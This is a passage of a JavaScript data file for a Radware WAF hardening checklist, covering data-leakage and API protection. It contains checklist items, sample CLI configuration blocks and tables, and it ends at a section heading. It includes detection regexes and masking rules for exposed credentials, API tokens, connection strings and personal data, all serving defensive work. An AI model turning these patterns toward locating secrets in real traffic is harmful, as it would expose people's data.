                { id: '14.2.1', text: 'Configure data masking for sensitive information', priority: 'critical' },
                { id: '14.2.2', text: 'Set up response filtering rules', priority: 'high' },
                { id: '14.2.3', text: 'Implement content substitution mechanisms', priority: 'medium' },
                { id: '14.2.4', text: 'Configure HTTP header filtering', priority: 'high' },
                { id: '14.2.5', text: 'Set up error message sanitization', priority: 'high' },
                { id: '14.2.6', text: 'Implement information disclosure prevention', priority: 'high' },
                { id: '14.2.7', text: 'Configure blocking thresholds for data leakage', priority: 'high' },
                { id: '14.2.8', text: 'Set up custom response pages for blocked requests', priority: 'medium' }
            ]
        },
        {
            title: '14.3 Database Protection',
            icon: 'fa-database',
            items: [
                { id: '14.3.1', text: 'Configure SQL error leakage prevention', priority: 'critical' },
                { id: '14.3.2', text: 'Set up database schema information protection', priority: 'high' },
                { id: '14.3.3', text: 'Implement database fingerprinting prevention', priority: 'medium' },
                { id: '14.3.4', text: 'Configure stored procedure name protection', priority: 'medium' },
                { id: '14.3.5', text: 'Set up connection string leakage prevention', priority: 'high' },
                { id: '14.3.6', text: 'Implement database version information masking', priority: 'medium' },
                { id: '14.3.7', text: 'Configure database dump protection', priority: 'high' },
                { id: '14.3.8', text: 'Set up excessive data return prevention', priority: 'medium' }
            ]
        },
        {
            title: '14.4 Document Protection',
            icon: 'fa-file-alt',
            items: [
                { id: '14.4.1', text: 'Configure document metadata stripping', priority: 'high' },
                { id: '14.4.2', text: 'Set up document type filtering', priority: 'medium' },
                { id: '14.4.3', text: 'Implement document watermarking', priority: 'low' },
                { id: '14.4.4', text: 'Configure document download controls', priority: 'medium' },
                { id: '14.4.5', text: 'Set up document size restrictions', priority: 'medium' },
                { id: '14.4.6', text: 'Implement content disposition controls', priority: 'medium' },
                { id: '14.4.7', text: 'Configure document DLP integration', priority: 'high' },
                { id: '14.4.8', text: 'Set up file type validation and enforcement', priority: 'high' }
            ]
        },
        {
            title: '14.5 Application Layer Protection',
            icon: 'fa-code',
            items: [
                { id: '14.5.1', text: 'Configure source code leakage protection', priority: 'critical' },
                { id: '14.5.2', text: 'Set up application path disclosure prevention', priority: 'high' },
                { id: '14.5.3', text: 'Implement internal IP address masking', priority: 'high' },
                { id: '14.5.4', text: 'Configure development information protection', priority: 'high' },
                { id: '14.5.5', text: 'Set up API token and key protection', priority: 'critical' },
                { id: '14.5.6', text: 'Implement framework information hiding', priority: 'medium' },
                { id: '14.5.7', text: 'Configure credentials leakage protection', priority: 'critical' },
                { id: '14.5.8', text: 'Set up configuration file exposure prevention', priority: 'high' }
            ]
        }
    ],
    techniques: [
        {
            title: 'Sensitive Data Detection Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware WAF to identify and protect various types of sensitive data from exposure.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure data leakage protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">data-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure PII detection patterns</div>
                    <div><span class="code-command">patterns</span></div>
                    <div><span class="code-param">credit-cards</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">ssn</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">email-addresses</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">phone-numbers</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">postal-addresses</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure custom data patterns</div>
                    <div><span class="code-command">custom-pattern</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"employee-id"</span></div>
                    <div><span class="code-command">custom-pattern</span> <span class="code-value">"employee-id"</span></div>
                    <div><span class="code-param">pattern-type</span> <span class="code-value">regex</span></div>
                    <div><span class="code-param">pattern</span> <span class="code-value">"EMP-[0-9]{6}"</span></div>
                    <div><span class="code-param">validation-pattern</span> <span class="code-value">"EMP-[0-9]{6}"</span></div>
                    <div><span class="code-param">confidence-level</span> <span class="code-value">high</span></div>
                    <div class="code-comment"># Configure detection thresholds</div>
                    <div><span class="code-command">thresholds</span></div>
                    <div><span class="code-param">min-matches</span> <span class="code-value">1</span></div>
                    <div><span class="code-param">max-matches</span> <span class="code-value">100</span></div>
                    <div><span class="code-param">match-severity</span> <span class="code-value">high</span></div>
                    <div class="code-comment"># Configure scanning scope</div>
                    <div><span class="code-command">scanning</span></div>
                    <div><span class="code-param">response-headers</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">response-body</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">request-parameters</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">cookies</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">json-responses</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">xml-responses</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Sensitive Data Categories and Detection Methods</h5>
                <p class="mb-4 text-gray-700">Common sensitive data types and optimal detection approaches:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Data Category</th>
                            <th class="p-3 border bg-gray-100">Detection Method</th>
                            <th class="p-3 border bg-gray-100">Example Pattern</th>
                            <th class="p-3 border bg-gray-100">Validation Approach</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Credit Card Numbers</td>
                            <td class="p-3 border">Regex + Luhn algorithm</td>
                            <td class="p-3 border">[0-9]{13,19} with formatting variations</td>
                            <td class="p-3 border">Luhn checksum validation + BIN range check</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Social Security Numbers</td>
                            <td class="p-3 border">Formatted regex</td>
                            <td class="p-3 border">[0-9]{3}-[0-9]{2}-[0-9]{4}</td>
                            <td class="p-3 border">High-entropy validation + structural check</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Email Addresses</td>
                            <td class="p-3 border">RFC-compliant regex</td>
                            <td class="p-3 border">[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}</td>
                            <td class="p-3 border">Domain validation + format check</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Medical Record Numbers</td>
                            <td class="p-3 border">Contextual regex</td>
                            <td class="p-3 border">MRN: [0-9]{5,10}</td>
                            <td class="p-3 border">Context validation + proximity check</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">API Keys/Tokens</td>
                            <td class="p-3 border">High-entropy detection</td>
                            <td class="p-3 border">[a-zA-Z0-9_\\-]{32,64}</td>
                            <td class="p-3 border">Entropy scoring + key prefix recognition</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Passport Numbers</td>
                            <td class="p-3 border">Country-specific regex</td>
                            <td class="p-3 border">Varies by country format</td>
                            <td class="p-3 border">Country code validation + format check</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Data Detection Best Practices</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Contextual Analysis:</strong> Consider data context to reduce false positives</li>
                    <li class="mb-2"><strong>Multi-Pattern Matching:</strong> Use multiple indicators to confirm sensitive data</li>
                    <li class="mb-2"><strong>Proximity Rules:</strong> Check for related terms near potential matches</li>
                    <li class="mb-2"><strong>Validation Logic:</strong> Apply data-specific validation for higher accuracy</li>
                    <li class="mb-2"><strong>Field Association:</strong> Link patterns to expected form fields or API responses</li>
                    <li class="mb-2"><strong>Pattern Tuning:</strong> Regularly tune patterns based on false positive/negative rates</li>
                    <li class="mb-2"><strong>Domain-Specific Rules:</strong> Create specific rules for healthcare, finance, etc.</li>
                </ul>
            `
        },
        {
            title: 'Data Masking and Response Filtering',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware WAF to mask or filter sensitive data in responses to prevent information disclosure.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure data masking and filtering</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">data-protection</span></div>
                    <div><span class="code-command">actions</span></div>
                    <div class="code-comment"># Configure data masking</div>
                    <div><span class="code-command">masking</span></div>
                    <div><span class="code-param">credit-card-masking</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">credit-card-show-digits</span> <span class="code-value">4</span></div>
                    <div><span class="code-param">ssn-masking</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">ssn-show-digits</span> <span class="code-value">4</span></div>
                    <div><span class="code-param">masking-character</span> <span class="code-value">"X"</span></div>
                    <div class="code-comment"># Configure response filtering</div>
                    <div><span class="code-command">filtering</span></div>
                    <div><span class="code-param">sql-error-filter</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">stack-trace-filter</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">path-disclosure-filter</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">internal-ip-filter</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure HTTP header protection</div>
                    <div><span class="code-command">header-protection</span></div>
                    <div><span class="code-param">server-header</span> <span class="code-value">mask</span></div>
                    <div><span class="code-param">x-powered-by</span> <span class="code-value">remove</span></div>
                    <div><span class="code-param">x-aspnet-version</span> <span class="code-value">remove</span></div>
                    <div><span class="code-param">custom-headers</span> <span class="code-value">"X-DB-Version,X-App-Version"</span></div>
                    <div class="code-comment"># Configure response replacement</div>
                    <div><span class="code-command">replacement</span></div>
                    <div><span class="code-param">replacement-text</span> <span class="code-value">"[Redacted for security]"</span></div>
                    <div><span class="code-param">error-page-replacement</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">custom-error-page</span> <span class="code-value">"/custom-error.html"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Data Masking Techniques</h5>
                <p class="mb-4 text-gray-700">Different approaches to masking sensitive data:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Masking Technique</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Example</th>
                            <th class="p-3 border bg-gray-100">Best For</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Character Masking</td>
                            <td class="p-3 border">Replace characters with a mask character</td>
                            <td class="p-3 border">XXXX-XXXX-XXXX-1234</td>
                            <td class="p-3 border">Credit cards, SSNs, account numbers</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Truncation</td>
                            <td class="p-3 border">Show only a portion of the data</td>
                            <td class="p-3 border">name@exam...</td>
                            <td class="p-3 border">Email addresses, long identifiers</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Complete Redaction</td>
                            <td class="p-3 border">Replace entire value with placeholder</td>
                            <td class="p-3 border">[REDACTED]</td>
                            <td class="p-3 border">API keys, passwords, credentials</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Pattern-Preserving</td>
                            <td class="p-3 border">Maintain format but change values</td>
                            <td class="p-3 border">555-XX-1234 (preserves format)</td>
                            <td class="p-3 border">Formatted identifiers where format matters</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Content Removal</td>
                            <td class="p-3 border">Remove elements entirely</td>
                            <td class="p-3 border">[Element removed]</td>
                            <td class="p-3 border">Error messages, stack traces</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Common Information Disclosure Points</h5>
                <p class="mb-4 text-gray-700">Critical areas to monitor for potential data leakage:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>HTTP Headers:</strong> Server, X-Powered-By, X-AspNet-Version headers reveal technology details</li>
                    <li class="mb-2"><strong>Error Messages:</strong> Detailed error messages often contain system paths, SQL queries, etc.</li>
                    <li class="mb-2"><strong>API Responses:</strong> Debug information, verbose errors, internal IDs in API responses</li>
                    <li class="mb-2"><strong>HTML Comments:</strong> Developer comments in HTML source containing sensitive information</li>
                    <li class="mb-2"><strong>JavaScript Source:</strong> API endpoints, keys, and business logic in client-side JavaScript</li>
                    <li class="mb-2"><strong>Document Metadata:</strong> Author information, internal paths in document properties</li>
                    <li class="mb-2"><strong>Response Headers:</strong> Custom headers with internal information like versions</li>
                </ul>
            `
        },
        {
            title: 'Application Infrastructure Protection',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware WAF to prevent exposure of application infrastructure details and sensitive system information.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure application infrastructure protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">app-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure code protection</div>
                    <div><span class="code-command">code-protection</span></div>
                    <div><span class="code-param">source-code-leakage</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">source-code-extensions</span> <span class="code-value">"php,java,cs,py,js,rb"</span></div>
                    <div><span class="code-param">configuration-files</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">config-file-patterns</span> <span class="code-value">"web.config,app.config,settings.json,*.ini,*.conf"</span></div>
                    <div class="code-comment"># Configure infrastructure information protection</div>
                    <div><span class="code-command">infrastructure-protection</span></div>
                    <div><span class="code-param">directory-listing</span> <span class="code-value">block</span></div>
                    <div><span class="code-param">internal-path-exposure</span> <span class="code-value">mask</span></div>
                    <div><span class="code-param">server-banner</span> <span class="code-value">remove</span></div>
                    <div><span class="code-param">framework-info</span> <span class="code-value">remove</span></div>
                    <div class="code-comment"># Configure credential protection</div>
                    <div><span class="code-command">credential-protection</span></div>
                    <div><span class="code-param">connection-string</span> <span class="code-value">mask</span></div>
                    <div><span class="code-param">hardcoded-credentials</span> <span class="code-value">mask</span></div>
                    <div><span class="code-param">authentication-tokens</span> <span class="code-value">mask</span></div>
                    <div><span class="code-param">api-keys</span> <span class="code-value">mask</span></div>
                    <div class="code-comment"># Configure database information protection</div>
                    <div><span class="code-command">database-protection</span></div>
                    <div><span class="code-param">sql-error-messages</span> <span class="code-value">mask</span></div>
                    <div><span class="code-param">db-schema-info</span> <span class="code-value">mask</span></div>
                    <div><span class="code-param">db-version-info</span> <span class="code-value">mask</span></div>
                    <div><span class="code-param">excessive-data</span> <span class="code-value">detect</span></div>
                    <div><span class="code-param">data-threshold</span> <span class="code-value">1000</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Common Infrastructure Exposure Points</h5>
                <p class="mb-4 text-gray-700">Key areas where application infrastructure details are commonly exposed:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Exposure Point</th>
                            <th class="p-3 border bg-gray-100">Typical Information Exposed</th>
                            <th class="p-3 border bg-gray-100">Protective Measure</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">HTTP Headers</td>
                            <td class="p-3 border">Web server type, version, programming language</td>
                            <td class="p-3 border">Header removal or modification</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Error Messages</td>
                            <td class="p-3 border">File paths, server names, line numbers</td>
                            <td class="p-3 border">Generic error page substitution</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Directory Listings</td>
                            <td class="p-3 border">File structure, internal resources</td>
                            <td class="p-3 border">Block or redirect directory listing requests</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Stack Traces</td>
                            <td class="p-3 border">Code flow, library versions, function calls</td>
                            <td class="p-3 border">Stack trace detection and removal</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Database Errors</td>
                            <td class="p-3 border">Database type, schema info, query structure</td>
                            <td class="p-3 border">SQL error message sanitization</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">HTML Comments</td>
                            <td class="p-3 border">Developer notes, TODOs, internal IPs</td>
                            <td class="p-3 border">HTML comment scrubbing</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Version Control Files</td>
                            <td class="p-3 border">.git, .svn directories exposing source code</td>
                            <td class="p-3 border">Block access to VCS directories and files</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Infrastructure Protection Strategies</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Custom Error Pages:</strong> Implement generic error pages that reveal no system details</li>
                    <li class="mb-2"><strong>Header Sanitization:</strong> Remove or modify headers that reveal system information</li>
                    <li class="mb-2"><strong>Path Normalization:</strong> Convert absolute paths to relative paths in responses</li>
                    <li class="mb-2"><strong>Response Filtering:</strong> Scan responses for patterns indicating infrastructure details</li>
                    <li class="mb-2"><strong>IP Address Masking:</strong> Detect and mask internal IP addresses in responses</li>
                    <li class="mb-2"><strong>Content Type Enforcement:</strong> Ensure source code files are never served as text</li>
                    <li class="mb-2"><strong>Version Information Removal:</strong> Remove version numbers from all responses</li>
                </ul>
            `
        }
    ],
    tools: [
        {
            title: 'Data Pattern Analyzer',
            icon: 'fa-search',
            description: 'Tool for identifying sensitive data patterns in web application traffic.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Data Analysis Tools'
        },
        {
            title: 'Response Masking Tester',
            icon: 'fa-eye-slash',
            description: 'Verify proper masking of sensitive data in application responses.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Masking Verification'
        },
        {
            title: 'Header Security Analyzer',
            icon: 'fa-shield-alt',
            description: 'Tool for analyzing and securing HTTP headers against information disclosure.',
            link: 'https://securityheaders.com/',
            linkText: 'Security Headers'
        },
        {
            title: 'Error Page Sanitizer',
            icon: 'fa-exclamation-triangle',
            description: 'Automates creation and deployment of security-conscious error pages.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Error Page Tools'
        },
        {
            title: 'API Response Analyzer',
            icon: 'fa-code',
            description: 'Examines API responses for potential data leakage and sensitive information.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'API Security Tools'
        },
        {
            title: 'PII Scanner',
            icon: 'fa-id-card',
            description: 'Advanced scanner for personally identifiable information in web traffic.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'PII Protection'
        }
    ]
},











{
    id: 'api-security-management',
    title: '15. API Security Management',
    subtitle: 'Comprehensive protection for REST, SOAP, GraphQL and other API services with Radware WAF',
    icon: 'fa-plug',
    priority: 'critical',
    progress: 0,
    checklist: [
        {
            title: '15.1 API Discovery & Profiling',
            icon: 'fa-search',
            items: [
                { id: '15.1.1', text: 'Configure automatic API discovery capabilities', priority: 'high' },
                { id: '15.1.2', text: 'Set up API inventory management', priority: 'high' },
                { id: '15.1.3', text: 'Implement API schema validation', priority: 'critical' },
                { id: '15.1.4', text: 'Configure API traffic learning and profiling', priority: 'high' },
                { id: '15.1.5', text: 'Set up API specification import (OpenAPI/Swagger)', priority: 'medium' },
                { id: '15.1.6', text: 'Implement versioning control for API protection', priority: 'medium' },
                { id: '15.1.7', text: 'Configure anomaly detection for API behavior', priority: 'high' },
                { id: '15.1.8', text: 'Set up custom API endpoint tracking', priority: 'medium' }
            ]
        },
        {
            title: '15.2 REST API Protection',
            icon: 'fa-exchange-alt',
            items: [
                { id: '15.2.1', text: 'Configure REST parameter validation', priority: 'critical' },
                { id: '15.2.2', text: 'Set up HTTP method enforcement for REST endpoints', priority: 'high' },
                { id: '15.2.3', text: 'Implement JSON payload validation', priority: 'critical' },
                { id: '15.2.4', text: 'Configure content-type enforcement', priority: 'high' },
                { id: '15.2.5', text: 'Set up REST URI structure validation', priority: 'medium' },
                { id: '15.2.6', text: 'Implement REST-specific attack signatures', priority: 'high' },
                { id: '15.2.7', text: 'Configure authentication token validation', priority: 'critical' },
                { id: '15.2.8', text: 'Set up REST API rate limiting', priority: 'high' }
            ]
        },
        {
            title: '15.3 SOAP/XML Protection',
            icon: 'fa-file-code',
            items: [
                { id: '15.3.1', text: 'Configure XML schema validation', priority: 'critical' },
                { id: '15.3.2', text: 'Set up WSDL validation and enforcement', priority: 'high' },
                { id: '15.3.3', text: 'Implement XML external entity (XXE) protection', priority: 'critical' },
                { id: '15.3.4', text: 'Configure XML bomb protection', priority: 'high' },
                { id: '15.3.5', text: 'Set up XML injection prevention', priority: 'high' },
                { id: '15.3.6', text: 'Implement SOAP action validation', priority: 'medium' },
                { id: '15.3.7', text: 'Configure XML namespace validation', priority: 'medium' },
                { id: '15.3.8', text: 'Set up SOAP fault information leakage prevention', priority: 'high' }
            ]
        },
        {
            title: '15.4 GraphQL Protection',
            icon: 'fa-project-diagram',
            items: [
                { id: '15.4.1', text: 'Configure GraphQL schema validation', priority: 'critical' },
                { id: '15.4.2', text: 'Set up GraphQL query depth limiting', priority: 'high' },
                { id: '15.4.3', text: 'Implement GraphQL query complexity analysis', priority: 'high' },
                { id: '15.4.4', text: 'Configure introspection query control', priority: 'high' },
                { id: '15.4.5', text: 'Set up GraphQL batch query protection', priority: 'medium' },
                { id: '15.4.6', text: 'Implement field-level access controls', priority: 'high' },
                { id: '15.4.7', text: 'Configure GraphQL-specific attack signatures', priority: 'high' },
                { id: '15.4.8', text: 'Set up GraphQL operation whitelisting', priority: 'medium' }
            ]
        },
        {
            title: '15.5 API Access Control',
            icon: 'fa-key',
            items: [
                { id: '15.5.1', text: 'Configure API key validation', priority: 'critical' },
                { id: '15.5.2', text: 'Set up JWT token validation', priority: 'critical' },
                { id: '15.5.3', text: 'Implement OAuth 2.0 token validation', priority: 'high' },
                { id: '15.5.4', text: 'Configure client certificate authentication', priority: 'high' },
                { id: '15.5.5', text: 'Set up IP-based API access control', priority: 'medium' },
                { id: '15.5.6', text: 'Implement API rate limiting by authentication', priority: 'high' },
                { id: '15.5.7', text: 'Configure API endpoint RBAC enforcement', priority: 'high' },
                { id: '15.5.8', text: 'Set up token replay attack prevention', priority: 'high' }
            ]
        },
        {
            title: '15.6 API Security Monitoring',
            icon: 'fa-chart-line',
            items: [
                { id: '15.6.1', text: 'Configure API-specific security logging', priority: 'high' },
                { id: '15.6.2', text: 'Set up API usage monitoring and analytics', priority: 'medium' },
                { id: '15.6.3', text: 'Implement API error rate monitoring', priority: 'high' },
                { id: '15.6.4', text: 'Configure API latency monitoring', priority: 'medium' },
                { id: '15.6.5', text: 'Set up API abuse alerting', priority: 'high' },
                { id: '15.6.6', text: 'Implement API security dashboard', priority: 'medium' },
                { id: '15.6.7', text: 'Configure API security reporting', priority: 'medium' },
                { id: '15.6.8', text: 'Set up API sensitive data exposure monitoring', priority: 'high' }
            ]
        }
    ],
    techniques: [
        {
            title: 'API Discovery and Schema Validation',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware WAF to discover, inventory, and validate API endpoints against their specifications.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure API discovery and schema validation</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">api-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure API discovery</div>
                    <div><span class="code-command">discovery</span></div>
                    <div><span class="code-param">auto-discovery</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">learning-period</span> <span class="code-value">7</span></div>
                    <div><span class="code-param">discovery-confidence</span> <span class="code-value">high</span></div>
                    <div><span class="code-param">api-inventory</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure OpenAPI/Swagger import</div>
                    <div><span class="code-command">schema</span></div>
                    <div><span class="code-command">import</span> <span class="code-param">name</span> <span class="code-value">"payment-api"</span></div>
                    <div><span class="code-param">schema-file</span> <span class="code-value">"/tmp/payment-api-v2.json"</span></div>
                    <div><span class="code-param">schema-type</span> <span class="code-value">openapi</span></div>
                    <div><span class="code-param">version</span> <span class="code-value">3.0</span></div>
                    <div><span class="code-param">base-path</span> <span class="code-value">"/api/v2/payments"</span></div>
                    <div class="code-comment"># Configure schema validation</div>
                    <div><span class="code-command">validation</span></div>
                    <div><span class="code-param">enforce-schema</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">parameter-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">response-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">content-type-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">undefined-endpoint-action</span> <span class="code-value">block</span></div>
                    <div class="code-comment"># Configure API learning</div>
                    <div><span class="code-command">learning</span></div>
                    <div><span class="code-param">parameter-profiling</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">value-profiling</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">pattern-recognition</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">auto-update-schema</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">API Specification Formats</h5>
                <p class="mb-4 text-gray-700">Comparison of different API specification formats supported by Radware WAF:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Specification Format</th>
                            <th class="p-3 border bg-gray-100">API Type</th>
                            <th class="p-3 border bg-gray-100">Key Features</th>
                            <th class="p-3 border bg-gray-100">Protection Benefits</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">OpenAPI/Swagger</td>
                            <td class="p-3 border">REST</td>
                            <td class="p-3 border">Endpoint definitions, parameter constraints, response schemas</td>
                            <td class="p-3 border">Comprehensive input validation, method enforcement, response validation</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">WSDL</td>
                            <td class="p-3 border">SOAP</td>
                            <td class="p-3 border">XML schema, operation definitions, message formats</td>
                            <td class="p-3 border">XML structure validation, SOAP action enforcement, operation validation</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">GraphQL Schema</td>
                            <td class="p-3 border">GraphQL</td>
                            <td class="p-3 border">Type definitions, query/mutation structures, directives</td>
                            <td class="p-3 border">Query validation, depth limiting, complexity analysis, type enforcement</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">gRPC Protocol Buffers</td>
                            <td class="p-3 border">gRPC</td>
                            <td class="p-3 border">Service definitions, message structures, RPC methods</td>
                            <td class="p-3 border">Message structure validation, method enforcement, service protection</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">RAML</td>
                            <td class="p-3 border">REST</td>
                            <td class="p-3 border">Resource modeling, hierarchical structure, reusable patterns</td>
                            <td class="p-3 border">Resource validation, parameter constraints, header validation</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">API Discovery Best Practices</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Baseline Traffic Analysis:</strong> Collect sufficient traffic samples for accurate API discovery</li>
                    <li class="mb-2"><strong>Specification Import:</strong> Use official API specifications when available for highest accuracy</li>
                    <li class="mb-2"><strong>Hybrid Approach:</strong> Combine specification import with learned behavior for comprehensive protection</li>
                    <li class="mb-2"><strong>Versioning Awareness:</strong> Track API versions separately and maintain specific policies</li>
                    <li class="mb-2"><strong>Continuous Learning:</strong> Configure ongoing learning for API evolution and changes</li>
                    <li class="mb-2"><strong>False Positive Tuning:</strong> Regularly review and tune discovery thresholds</li>
                    <li class="mb-2"><strong>Shadow API Detection:</strong> Monitor for undocumented or unauthorized API endpoints</li>
                </ul>
            `
        },
        {
            title: 'RESTful API Protection',
            content: `
                <p class="mb-4 text-gray-700">Configure comprehensive protection mechanisms for REST APIs in Radware WAF.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure REST API protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">api-protection</span></div>
                    <div><span class="code-command">rest-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure HTTP method enforcement</div>
                    <div><span class="code-command">method-enforcement</span></div>
                    <div><span class="code-param">strict-methods</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">allowed-methods</span> <span class="code-value">"GET,POST,PUT,DELETE,PATCH"</span></div>
                    <div><span class="code-param">method-override-protection</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure content validation</div>
                    <div><span class="code-command">content-validation</span></div>
                    <div><span class="code-param">json-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">max-json-depth</span> <span class="code-value">20</span></div>
                    <div><span class="code-param">max-array-elements</span> <span class="code-value">1000</span></div>
                    <div><span class="code-param">max-object-members</span> <span class="code-value">100</span></div>
                    <div><span class="code-param">max-string-length</span> <span class="code-value">32768</span></div>
                    <div><span class="code-param">max-integer-value</span> <span class="code-value">999999999</span></div>
                    <div class="code-comment"># Configure parameter validation</div>
                    <div><span class="code-command">parameter-validation</span></div>
                    <div><span class="code-param">required-parameters</span> <span class="code-value">enforce</span></div>
                    <div><span class="code-param">parameter-type-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">parameter-format-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">unknown-parameters</span> <span class="code-value">block</span></div>
                    <div class="code-comment"># Configure attack protection</div>
                    <div><span class="code-command">attack-protection</span></div>
                    <div><span class="code-param">json-injection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">rest-specific-signatures</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">parameter-pollution</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">REST API Attack Vectors</h5>
